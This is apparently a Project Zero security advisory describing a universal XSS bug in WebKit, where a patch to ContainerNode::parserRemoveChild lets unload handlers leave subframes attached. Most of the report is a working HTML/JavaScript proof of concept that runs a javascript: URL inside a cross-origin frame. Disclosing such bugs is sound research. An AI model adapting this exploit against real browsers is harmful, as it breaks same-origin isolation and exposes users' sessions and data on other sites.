# UXSS: the patch of #1110 made another bug

### Reported by <lokihardt@google.com>, Feb 16 2017

Here's the patch of #1110.
https://trac.webkit.org/changeset/212218/trunk/Source/WebCore/dom/ContainerNode.cpp

```cpp
void ContainerNode::parserRemoveChild(Node& oldChild)
{
    disconnectSubframesIfNeeded(*this, DescendantsOnly); <<---- (a)
    ...
}
```

(a) was added for the fix. But in |disconnectSubframesIfNeeded|, which fires unload event handlers, |oldChild|'s parent may be replaced. As a result, subframes of |oldChild| will be not detached.

PoC:

```html
<body>
    <div>
        <b>
            <p>
                <script>
                d = document.querySelector('div');
                p = document.querySelector('p');
                p.parentElement.appendChild(document.createElement('iframe')).contentWindow.onunload = () => {
                    document.body.appendChild(p);
                    d.remove();

                    f = p.appendChild(document.createElement('iframe'));
                    f.onload = () => {
                        f.onload = null;

                        document.documentElement.innerHTML = '';

                        f.src = 'javascript:alert(location)';

                        let xml = `
<svg xmlns="http://www.w3.org/2000/svg">
<script>
document.documentElement.appendChild(document.createElementNS('http://www.w3.org/1999/xhtml', 'iframe')).contentWindow.onunload = () => {
    document.documentElement.appendChild(parent.f.parentElement.parentElement.parentElement);
};
</sc` + `ript>
<element a="1" a="2" />
</svg>`;

                        let tmp = document.documentElement.appendChild(document.createElement('iframe'));
                        tmp.src = URL.createObjectURL(new Blob([xml], {type: 'text/xml'}));
                    };
                    f.src = 'https://abc.xyz/';
                };
                </script>
            </b>
        </p>
    </div>
</body>
```

Link: https://bugs.chromium.org/p/project-zero/issues/detail?id=1132
